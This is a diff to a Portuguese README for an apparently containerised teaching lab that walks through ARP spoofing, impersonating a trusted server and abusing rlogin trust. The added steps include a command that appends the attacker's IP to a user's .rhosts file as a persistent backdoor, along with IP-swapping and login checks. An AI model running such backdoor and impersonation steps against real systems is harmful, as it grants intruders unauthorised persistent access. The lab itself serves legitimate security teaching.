@@ -37,12 +37,14 @@ A largura de banda do trusted_server é limitada, para simular uma interface de 
 
 ### Ataque
 
-O ataque será feito em quatro etapas:
-    1. [Arp Spoofing](./Readme.md#realizando-o-arp-spoofing)
-    2. [Negação de serviço](./Readme.md#realizando-a-negação-de-serviço)
-    3. [Personificação](./Readme.md#realizando-a-personificação)
-    4. [Invadindo](./Readme.md#invadindo)
-    5. [Backdoor](./Readme.md#backdoor)
+O ataque será feito em 5 etapas:
+
+1. [Arp Spoofing](./Readme.md#realizando-o-arp-spoofing)
+2. [Negação de serviço](./Readme.md#realizando-a-negação-de-serviço)
+3. [Personificação](./Readme.md#realizando-a-personificação)
+4. [Invasão](./Readme.md#invadindo)
+5. [Backdoor](./Readme.md#configurando-o-backdoor)
+
 ***
 
 ## Requisitos
@@ -69,6 +71,22 @@ O ataque será feito em quatro etapas:
     docker exec -it attacker bash
     docker exec -it victim bash
     ```
+
+    Para explorar a relação de confiança entre o trusted_server e o x-terminal, execute o seguinte comando no terminal do trusted_server:
+
+    ```bash
+    rlogin -l fontoura x-terminal
+    ```
+
+    Isso fará com que o usuário fontoura seja logado no x-terminal sem a necessidade de uma senha.
+
+    Agora, para verificar que o x-terminal não pode ser acessado por outras máquinas, execute o seguinte comando no terminal do attacker:
+
+    ```bash
+    rlogin -l fontoura x-terminal
+    ```
+
+    O comando acima tentará realizar o login no x-terminal. Como o attacker não é o trusted_server, o login necessitará de uma senha.
 
 3. Realizando o arp spoofing
 
@@ -108,6 +126,8 @@ O ataque será feito em quatro etapas:
 
     Agora, o attacker está se passando pelo trusted_server para o x-terminal.
 
+6. Invadindo
+
     Para verificar que a personificação foi realizada com sucesso, podemos tentar realizar o login sem senha em x-terminal. A partir do attacker, execute o seguinte comando:
 
     ```bash
@@ -116,12 +136,37 @@ O ataque será feito em quatro etapas:
 
     O comando acima tentará realizar o login no x-terminal. Como o attacker está se passando pelo trusted_server, o login será realizado com sucesso e o usuário fontoura será logado no x-terminal sem a necessidade de uma senha.
 
-6. configurando o backdoor
+7. configurando o backdoor
 
     Para abrir a conexão através do rlogin ao x-terminal para o attacker, execute o seguinte comando no terminal do x-terminal:
 
     ```bash
     echo '172.28.1.4 root' >> /home/fontoura/.rhosts
+    ```
+
+    Isso permitirá que o attacker se logue no x-terminal sem a necessidade de uma senha.
+
+8. Conclusão
+
+    Com o backdoor configurado, podemos retornar o IP do attacker para o seu IP original. Para isso, execute o seguinte comando no terminal do attacker:
+
+    ```bash
+    ifconfig eth0 172.28.1.4
+    ```
+
+    Para verificar que o backdoor está funcionando, execute o seguinte comando no terminal do attacker:
+
+    ```bash
+    rlogin -l fontoura x-terminal
+    ```
+
+    Se o backdoor estiver funcionando, o usuário fontoura será logado no x-terminal sem a necessidade de uma senha.
+
+    Para conferir que os pacotes não estão passando pelo trusted_server, execute o seguinte comando no terminal do attacker:
+
+    ```bash
+    tcpdump -i eth0 
+    ```
 
 ***
 
